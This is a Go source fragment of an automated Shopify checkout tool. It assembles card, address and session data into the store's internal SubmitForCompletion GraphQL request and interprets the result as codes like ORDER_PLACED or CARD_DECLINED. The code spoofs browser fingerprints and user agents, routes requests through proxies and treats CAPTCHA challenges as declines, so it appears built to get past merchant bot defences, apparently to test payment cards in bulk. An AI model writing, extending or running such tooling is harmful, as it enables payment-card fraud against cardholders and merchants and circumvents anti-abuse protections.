	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", randomChromeUA())
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", checkoutToken)
	_ = checkoutPath

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("PollForReceipt request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := readResponseBody(resp)
	if err != nil {
		return resp.StatusCode, "", fmt.Errorf("reading PollForReceipt response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func sendSubmitForCompletion(
	client tls_client.HttpClient,
	shopURL, checkoutURL, checkoutToken, sessionToken,
	stableID, variantID, price,
	submitID, buildID, sourceToken, queueToken, email string,
	addr Address,
	deliveryHandle, shippingAmount, totalAmount,
	pciSessionID, attemptToken, currency, country string,
	signedHandles []string,
	paymentMethodIdentifier, cardNumber, proxyURL string,
) (int, string, error) {

	cardBin := strings.ReplaceAll(cardNumber, " ", "")
	if len(cardBin) > 8 {
		cardBin = cardBin[:8]
	}

	var handleLines []string
	for _, h := range signedHandles {
		handleLines = append(handleLines, fmt.Sprintf(`{"signedHandle":%s}`, strconv.Quote(h)))
	}
	signedHandlesJSON := "[" + strings.Join(handleLines, ",") + "]"

	pageID := generatePageID()

	gqlPayload := fmt.Sprintf(`{
  "variables": {
    "input": {
      "sessionInput": {
        "sessionToken": %q
      },
      "queueToken": %q,
      "discounts": {
        "lines": [],
        "acceptUnexpectedDiscounts": true
      },
      "delivery": {
        "deliveryLines": [
          {
            "destination": {
              "streetAddress": {
                "address1": %q,
                "address2": %q,
                "city": %q,
                "countryCode": %q,
                "postalCode": %q,
                "firstName": %q,
                "lastName": %q,
                "zoneCode": %q,
                "phone": %q,
                "oneTimeUse": false
              }
            },
            "selectedDeliveryStrategy": {
              "deliveryStrategyByHandle": {
                "handle": %q,
                "customDeliveryRate": false
              },
              "options": {"phone": %q}
            },
            "targetMerchandiseLines": {
              "lines": [
                {"stableId": %q}
              ]
            },
            "deliveryMethodTypes": ["SHIPPING"],
						"expectedTotalPrice": {"any": true},
            "destinationChanged": false
          }
        ],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      },
      "deliveryExpectations": {
        "deliveryExpectationLines": %s
      },
      "merchandise": {
        "merchandiseLines": [
          {
            "stableId": %q,
            "merchandise": {
              "productVariantReference": {
                "id": "gid://shopify/ProductVariantMerchandise/%s",
                "variantId": "gid://shopify/ProductVariant/%s",
                "properties": [],
                "sellingPlanId": null,
                "sellingPlanDigest": null
              }
            },
            "quantity": {
              "items": {"value": 1}
            },
						"expectedTotalPrice": {"any": true},
            "lineComponentsSource": null,
            "lineComponents": []
          }
        ]
      },
      "memberships": {"memberships": []},
      "payment": {
				"totalAmount": {
					"value": {
						"amount": %q,
						"currencyCode": "USD"
					}
				},
        "paymentLines": [
          {
            "paymentMethod": {
              "directPaymentMethod": {
                "paymentMethodIdentifier": %q,
                "sessionId": %q,
                "billingAddress": {
                  "streetAddress": {
                    "address1": %q,
                    "address2": %q,
                    "city": %q,
                    "countryCode": %q,
                    "postalCode": %q,
                    "firstName": %q,
                    "lastName": %q,
                    "zoneCode": %q,
                    "phone": %q
                  }
                },
                "cardSource": null
              },
              "giftCardPaymentMethod": null,
              "redeemablePaymentMethod": null,
              "walletPaymentMethod": null,
              "walletsPlatformPaymentMethod": null,
              "localPaymentMethod": null,
              "paymentOnDeliveryMethod": null,
              "paymentOnDeliveryMethod2": null,
              "manualPaymentMethod": null,
              "customPaymentMethod": null,
              "offsitePaymentMethod": null,
              "customOnsitePaymentMethod": null,
              "deferredPaymentMethod": null,
              "customerCreditCardPaymentMethod": null,
              "paypalBillingAgreementPaymentMethod": null,
              "remotePaymentInstrument": null
            },
            "amount": {
              "value": {
                "amount": %q,
                "currencyCode": "USD"
              }
            }
          }
        ],
        "billingAddress": {
          "streetAddress": {
            "address1": %q,
            "address2": %q,
            "city": %q,
            "countryCode": %q,
            "postalCode": %q,
            "firstName": %q,
            "lastName": %q,
            "zoneCode": %q,
            "phone": %q
          }
        },
        "creditCardBin": %q
      },
      "buyerIdentity": {
        "customer": {
          "presentmentCurrency": "USD",
          "countryCode": "US"
        },
        "email": %q,
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [{"email": {"consentState": "DECLINED", "value": %q}}],
        "shopPayOptInPhone": {"countryCode": "US"},
        "rememberMe": false
      },
      "tip": {"tipLines": []},
      "taxes": {
        "proposedAllocations": null,
        "proposedTotalAmount": {"any": true},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      },
      "note": {
        "message": null,
        "customAttributes": []
      },
      "localizationExtension": {"fields": []},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {
        "signature": null,
        "signatureUuid": null,
        "lineItemScriptChanges": [],
        "paymentScriptChanges": [],
        "shippingScriptChanges": []
      },
      "optionalDuties": {"buyerRefusesDuties": false},
      "cartMetafields": []
    },
    "attemptToken": %q,
    "metafields": [],
    "analytics": {
      "requestUrl": %q,
      "pageId": %q
    }
  },
  "operationName": "SubmitForCompletion",
  "id": %q
}`,
		sessionToken, queueToken,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		deliveryHandle,
		addr.Phone,
		stableID,
		signedHandlesJSON,
		stableID, variantID, variantID,
		totalAmount,
		paymentMethodIdentifier,
		pciSessionID,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		totalAmount,
		addr.Address1, addr.Address2, addr.City, addr.CountryCode, addr.PostalCode, addr.FirstName, addr.LastName, addr.ZoneCode, addr.Phone,
		cardBin,
		email,
		email,
		attemptToken, checkoutURL, pageID,
		submitID)
	gqlPayload = patchPayload(gqlPayload, currency, country)

	req, err := fhttp.NewRequest("POST", shopURL+"/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion", strings.NewReader(gqlPayload))
	if err != nil {
		return 0, "", fmt.Errorf("building request: %w", err)
	}

	req.Header.Set("accept", "application/json")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("accept-language", "en-US")
	req.Header.Set("content-type", "application/json")
	req.Header.Set("origin", shopURL)
	req.Header.Set("priority", "u=1, i")
	req.Header.Set("referer", checkoutURL)
	req.Header.Set("sec-ch-ua", randomSecChUA())
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("sec-ch-ua-platform", `"Windows"`)
	req.Header.Set("sec-fetch-dest", "empty")
	req.Header.Set("sec-fetch-mode", "cors")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("shopify-checkout-client", "checkout-web/1.0")
	req.Header.Set("shopify-checkout-source", fmt.Sprintf(`id="%s", type="cn"`, checkoutToken))
	req.Header.Set("user-agent", randomChromeUA())
	req.Header.Set("x-checkout-one-session-token", sessionToken)
	req.Header.Set("x-checkout-web-build-id", buildID)
	req.Header.Set("x-checkout-web-deploy-stage", "production")
	req.Header.Set("x-checkout-web-server-handling", "fast")
	req.Header.Set("x-checkout-web-server-rendering", "yes")
	req.Header.Set("x-checkout-web-source-id", sourceToken)

	resp, err := doWithRetry(client, req, 2)
	if err != nil && proxyURL != "" {
		if req.GetBody != nil {
			if rb, gbErr := req.GetBody(); gbErr == nil {
				req.Body = rb
			}
		}
		fallbackClient, fbErr := createNoProxyClient()
		if fbErr == nil {
			resp, err = doWithRetry(fallbackClient, req, 2)
		}
	}
	if err != nil {
		return 0, "", fmt.Errorf("POST SubmitForCompletion: %w", err)
	}
	defer resp.Body.Close()

	body, err := readResponseBody(resp)
	if err != nil {
		return 0, "", fmt.Errorf("reading response: %w", err)
	}

	return resp.StatusCode, string(body), nil
}

func checkProposalErrors(step string, status int, body string) {}

func checkSubmitErrors(status int, body string) {
	if m := submitTypeRe.FindStringSubmatch(body); len(m) > 1 && m[1] != "SubmitSuccess" {
		fmt.Printf("[SUBMIT] non-success: %s\n", m[1])
		matches := proposalErrorRe.FindAllStringSubmatch(body, -1)
		for _, em := range matches {
			fmt.Printf("[SUBMIT] error: %s — %s\n", em[1], em[2])
		}
	}
}

func saveDebugResponse(name, body string) {
	_ = os.MkdirAll("debug", 0o755)
	safe := strings.NewReplacer("/", "_", `\`, "_", ":", "_").Replace(name)
	_ = os.WriteFile(filepath.Join("debug", safe+".html"), []byte(body), 0o644)
}

func extractReceiptStatusCode(pollBody, receiptType string) string {
	if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
		return "ORDER_PLACED"
	}
	if receiptType == "ProcessingReceipt" {
		return "PROCESSING"
	}

	codeRe := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
	if m := codeRe.FindStringSubmatch(pollBody); len(m) > 1 {
		return m[1]
	}

	if strings.Contains(pollBody, "CAPTCHA") {
		return "CARD_DECLINED"
	}

	if receiptType == "FailedReceipt" {
		return "FAILED"
	}

	return "UNKNOWN"
}
